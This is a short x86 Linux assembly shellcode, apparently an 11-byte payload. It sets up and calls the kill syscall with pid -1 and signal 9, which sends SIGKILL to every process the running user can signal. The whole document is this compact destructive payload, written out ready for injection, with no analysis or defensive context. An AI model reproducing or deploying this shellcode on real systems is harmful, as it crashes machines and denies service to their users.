;11 bytes
;use stack to clear out and push sys_kill syscall
push 0x25
pop eax
;push -1 directly 
push byte -1
pop ebx
push 0x9
pop ecx
int 0x80
